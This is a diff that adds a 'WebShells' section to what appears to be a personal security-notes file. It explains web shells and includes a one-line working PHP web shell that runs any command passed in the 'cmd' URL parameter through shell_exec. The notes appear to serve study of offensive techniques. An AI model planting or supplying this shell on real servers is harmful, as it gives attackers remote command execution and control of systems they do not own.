@@ -213,6 +213,12 @@ ___
 ### WebShells
 [[#Table of contents|Back to the top]]
 
+*Script that runs on webserver (in PHP or ASP for instance), executes code on server*
+*Commands are entered on webpage (HTML form / directly into URL), then executed by script, results written on page*
+
+`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+*gets parameter called "cmd" and executes it with shell_exec(), "pre" ensures correct formating of output*
+
 
 
 ___
